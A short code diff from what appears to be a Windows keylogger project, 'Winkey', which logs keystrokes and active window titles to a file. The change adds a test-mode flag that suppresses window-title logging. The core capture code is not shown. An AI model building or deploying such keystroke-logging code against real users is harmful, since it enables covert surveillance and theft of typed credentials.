@@ -1,11 +1,12 @@
 #include "Winkey.hpp"
 
 // Declare the attributes which are used by the static methods
-const char* Winkey::_logFileName = TW_LOGFILE;
-std::wofstream Winkey::_logFile;
-std::wstring Winkey::_windowTitle;
-std::wstring Winkey::_keyStroke;
-HWND Winkey::_currentWindow;
+bool            Winkey::_testMode;
+const char*     Winkey::_logFileName = TW_LOGFILE;
+std::wofstream  Winkey::_logFile;
+std::wstring    Winkey::_windowTitle;
+std::wstring    Winkey::_keyStroke;
+HWND            Winkey::_currentWindow;
 
 Winkey::Winkey()
 {
@@ -54,7 +55,7 @@ void Winkey::setHooks()
 }
 
 // Run the main loop of the program
-void Winkey::run()
+void Winkey::run(bool testMode)
 {
     /*
      * Main message loop
@@ -63,6 +64,9 @@ void Winkey::run()
      */
 
     MSG msg;
+
+    _testMode = testMode;
+
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
@@ -73,8 +77,8 @@ void Winkey::logToFile()
 {
     static HWND lastWindow = nullptr;
 
-    // Only log the window title if it has changed
-    if (_currentWindow != lastWindow)
+    // Only log the window title if it has changed (and we're not in test mode)
+    if (!_testMode && (_currentWindow != lastWindow))
     {
         time_t now = time(nullptr);
 
